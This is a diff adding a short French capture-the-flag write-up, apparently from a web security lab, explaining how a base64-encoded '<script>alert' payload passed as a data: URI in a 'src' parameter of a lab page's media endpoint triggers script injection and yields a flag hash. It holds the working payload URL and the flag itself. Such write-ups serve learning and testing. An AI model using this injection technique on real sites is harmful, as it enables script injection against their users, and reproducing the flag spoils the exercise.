@@ -1,0 +1,21 @@
+Il faut envoyer un script d'alert encodé en base64 directement dans la src de la page nsa.
+
+Le script est donc:
+
+<script>alert
+
+qui donne en base 64:
+
+PHNjcmlwdD5hbGVydAoK
+
+On effectue apres:
+
+http://10.11.200.147/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydAoK
+
+Et on obtient le flag:
+
+928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D
+
+lien qui a aider a trouver:
+
+http://www.funinformatique.com/faille-include-comment-lexploiter-et-sen-proteger/
